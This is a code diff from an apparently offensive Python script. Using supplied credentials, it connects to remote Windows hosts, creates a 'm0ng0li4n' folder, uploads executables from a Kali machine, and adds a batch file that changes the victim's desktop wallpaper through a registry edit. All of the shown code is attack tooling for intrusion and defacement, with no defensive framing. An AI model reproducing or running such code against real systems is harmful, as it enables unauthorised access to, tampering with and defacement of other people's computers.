@@ -18,6 +18,10 @@ def doLinux(handle, user, password, ip):
     print(colored(Fore.GREEN + ip + 'has been dealt with'))
 
 def doWindows(handle, user, password, ip):
+    f = open('windowsWallaper.bat','wt')
+    f.write('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d C:\\Users\\'+user+'\\m0ng0li4n\\wallpaper.bmp /f \n')
+    f.write('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
+    f.close()
     handle.makedirs('C:\\Users\\'+user+'\\m0ng0li4n')
     handle.put('/home/kali/Desktop/Mongolian/bin/windowsFlow.exe','C:\\Users\\'+user+'\\m0ng0li4n\\windowsFlow.exe')
     handle.put('/home/kali/Desktop/Mongolian/bin/windowsSaver.exe','C:\\Users\\'+user+'\\m0ng0li4n\\windowsSaver.exe')
